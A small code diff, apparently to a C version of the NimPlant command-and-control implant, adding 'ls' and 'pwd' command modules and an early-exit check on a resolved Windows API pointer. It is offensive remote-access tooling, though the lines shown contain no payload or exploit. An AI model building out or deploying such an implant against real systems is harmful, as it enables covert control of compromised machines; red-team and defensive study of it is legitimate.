@@ -111,6 +111,8 @@
 #include "../inc/metadata/process_name.c"
 #include "../inc/commands/cat.c"
 #include "../inc/commands/cd.c"
+#include "../inc/commands/ls.c"
+#include "../inc/commands/pwd.c"
 #include "../inc/commands/whoami.c"
 #include "../inc/client.c"
 
@@ -167,6 +169,8 @@ int __main () {
         NimPlantUserAgent,
         XorKey
     );
+
+    if (context.functions.PathFileExistsA == NULL) return 8;
 
     // Set `rand` seed
     context.functions.srand(context.functions.time(NULL));
